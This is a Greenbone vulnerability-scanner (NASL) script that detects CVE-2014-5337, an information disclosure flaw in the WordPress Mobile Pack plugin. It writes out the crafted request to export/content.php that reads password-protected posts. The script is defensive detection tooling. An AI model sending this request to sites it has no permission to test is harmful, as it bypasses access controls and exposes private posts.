# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804838");
  script_version("2023-07-26T05:05:09+0000");
  script_cve_id("CVE-2014-5337");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"2023-07-26 05:05:09 +0000 (Wed, 26 Jul 2023)");
  script_tag(name:"creation_date", value:"2014-09-09 14:31:29 +0530 (Tue, 09 Sep 2014)");

  script_name("WordPress Mobile Pack Plugin Information Disclosure Vulnerability");

  script_tag(name:"summary", value:"WordPress Mobile Pack Plugin is prone to an information disclosure vulnerability.");

  script_tag(name:"vuldetect", value:"Send the crafted HTTP GET request and
  check is it possible to read the password protected posts.");

  script_tag(name:"insight", value:"The flaw is due to an error in the
  export/content.php script which does not restrict access to password
  protected posts.");

  script_tag(name:"impact", value:"Successful exploitation will allow
  attackers to bypass certain security restrictions and read password protected
  posts containing valuable information.");

  script_tag(name:"affected", value:"WordPress Mobile Pack plugin
  version  2.0.1 and earlier.");

  script_tag(name:"solution", value:"Update to version 2.0.2 or later.");
  script_tag(name:"solution_type", value:"VendorFix");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/127949");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/69292");
  script_xref(name:"URL", value:"http://wordpress.org/plugins/wordpress-mobile-pack/changelog");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_dependencies("gb_wordpress_http_detect.nasl");
  script_mandatory_keys("wordpress/http/detected");
  script_require_ports("Services/www", 80);
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + "/wp-content/plugins/wordpress-mobile-pack/export/content.p" +
            "hp?content=exportarticles&callback=x";

if(http_vuln_check(port:port, url:url, check_header:TRUE,
   pattern:"x\(.*id.*title.*author.*date.*description"))
{
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}
